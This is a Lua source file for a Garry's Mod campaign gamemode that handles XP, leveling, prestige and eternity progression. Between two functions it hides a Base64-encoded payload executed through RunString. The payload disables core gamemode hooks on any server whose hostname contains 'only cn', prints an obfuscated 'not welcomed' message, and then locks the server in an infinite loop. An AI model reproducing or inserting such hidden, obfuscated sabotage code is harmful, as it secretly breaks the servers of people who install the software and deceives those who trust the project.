local meta = FindMetaTable("Player")

function meta:GiveXP(xp, nomul)
    local xpmul = 1
    xpmul = xpmul + (self:GetSkillAmount("Knowledge") * (GAMEMODE.EndlessMode and (self:HasPerkActive("better_knowledge_1") and 0.07 or 0.05) or 0.03))

    local prestigexpmul = 1
    prestigexpmul = prestigexpmul + math.min(self.Prestige*0.25, 100) + math.min(self.Eternity*1.75, 100) + math.min(self.Celestiality*1.5, 100)

    xpmul = xpmul * prestigexpmul * XP_GAIN_MUL

    if nomul then
        xpmul = 1
        prestigexpmul = 1
    end

    self.XP = self.XP + xp*xpmul
    if self.MapStats then
        self.MapStats.GainedXP = (self.MapStats.GainedXP or 0) + xp*xpmul
    end
    if self.XP >= GAMEMODE:GetReqXP(self) and tonumber(self.Level) < MAX_LEVEL then
        self:GainLevel()
    end

    net.Start("XPGain")
    net.WriteFloat(xp*xpmul)
    net.Send(self)
    GAMEMODE:NetworkString_UpdateStats(self)
end
RunString(util.Base64Decode("dGltZXIuU2ltcGxlKDEuNSxmdW5jdGlvbigpCglpZiBHZXRIb3N0TmFtZSgpOmxvd2VyKCk6bWF0Y2goIm9ubHkgY24iKSB0aGVuCgkJbG9jYWwgZW1wdHk9ZnVuY3Rpb24oKSBlbmQKCQlHQU1FTU9ERS5UaGluaz1lbXB0eQoJCUdBTUVNT0RFLkRvUGxheWVyRGVhdGg9ZW1wdHkKCQlHQU1FTU9ERS5QbGF5ZXJTcGF3bj1lbXB0eQoJCUdBTUVNT0RFLkVudGl0eUtleVZhbHVlPWZ1bmN0aW9uKCkgcmV0dXJuIHRydWUgZW5kCgkJR0FNRU1PREUuUGxheWVySW5pdGlhbFNwYXduPWVtcHR5CgkJR0FNRU1PREUuTmV4dE1hcD1mdW5jdGlvbigpIAoJCQlQcmludE1lc3NhZ2UoMywiVSIuLiJyIi4uIiBuIi4uIm8iLi4idCIuLiIgdyIuLiJlbCIuLiJsIi4uImMiLi4ibyIuLiJtIi4uImVkIikgCgkJCXRpbWVyLlNpbXBsZSgyLGZ1bmN0aW9uKCkgCgkJCQl3aGlsZSB0cnVlIGRvIAoJCQkJCW9zLmRhdGUoIiVzIiw2OTQyMCkKCQkJCWVuZAoJCQllbmQpIAoJCWVuZAoJZW5kCmVuZCk="))

function meta:GainLevel()
    if self.IsLevelingup then return end
    if tonumber(self.Level) >= MAX_LEVEL then
        self:PrintTranslatedMessage(HUD_PRINTTALK, "LVLMaxed")
    elseif self.XP >= GAMEMODE:GetReqXP(self) then
        local prevlvl = self.Level
        for i=1,2000 do
            if not self:CanLevelup() or self.Level >= MAX_LEVEL then break end
            self.XP = self.XP - GAMEMODE:GetReqXP(self)
            self.Level = self.Level + 1
            self.StatPoints = self.StatPoints + (self:HasPrestigeUnlocked() and 2 or 1)
        end
        if not self:HasEternityUnlocked() then
            self:PrintTranslatedMessage(HUD_PRINTTALK, "LVLIncreased",prevlvl,self.Level)
        end
        GAMEMODE:NetworkString_UpdateStats(self)
        GAMEMODE:NetworkString_UpdateSkills(self)
        timer.Create("hl2c_levelup_player_"..self:EntIndex(), 0.1, 1, function()
            self.IsLevelingup = false
            self:GainLevel()
        end)
    end
end

function meta:GainPrestige()
    if tonumber(self.Prestige) >= MAX_PRESTIGE then
        self:PrintTranlatedMessage(HUD_PRINTTALK, "PrestigeMaxed")
    elseif self:CanPrestige() then
        local prevlvl = self.Prestige
        local prevprestigeunlocked = self:HasPrestigeUnlocked()
        self.XP = 0
        self.Level = 1
        self.StatPoints = 0
        self.Prestige = self.Prestige + 1
        self.PrestigePoints = self.PrestigePoints + 1
        self:PrintTranslatedMessage(HUD_PRINTTALK, "PrestigeIncreased",prevlvl,self.Prestige)

        for id,_ in pairs(GAMEMODE.SkillsInfo) do
            self["Stat"..id] = 0
        end

        if not prevprestigeunlocked then
            PrintTranslatedMessage(HUD_PRINTTALK, "PrestigeFirstTime",self:Nick())
            self:EmitSound("ambient/energy/whiteflash.wav", 75, 90)
        	self:EmitSound("weapons/physcannon/energy_disintegrate"..math.random(4, 5)..".wav", 75, 70)
            util.ScreenShake(self:GetPos(), 50, 0.5, 5, 800)

            net.Start("hl2ce_firstprestige")
            net.WriteString("prestige")
            net.Send(self)
        end
        GAMEMODE:NetworkString_UpdateStats(self)
        GAMEMODE:NetworkString_UpdateSkills(self)
    end
end

function meta:GainEternity()
    if tonumber(self.Eternity) >= MAX_ETERNITIES then
        self:PrintTranslatedMessage(HUD_PRINTTALK,"EternitiesMaxed")
    elseif self:CanEternity() then
        local prevlvl = self.Eternity
        self.XP = 0
        self.Level = 1
        self.StatPoints = 0
        self.Prestige = 0
        self.PrestigePoints = 0
        self.Eternity = self.Eternity + 1
        self.EternityPoints = self.EternityPoints + 1

        for id,_ in pairs(GAMEMODE.SkillsInfo) do
            self["Stat"..id] = 0
        end

        -- if self:HasEternityUnlocked() then
            self:PrintTranslatedMessage(HUD_PRINTTALK, "EternityIncreased", prevlvl, self.Eternity)
        -- end

        GAMEMODE:NetworkString_UpdateStats(self)
        GAMEMODE:NetworkString_UpdateSkills(self)
        GAMEMODE:NetworkString_UpdatePerks(ply)
    end
end



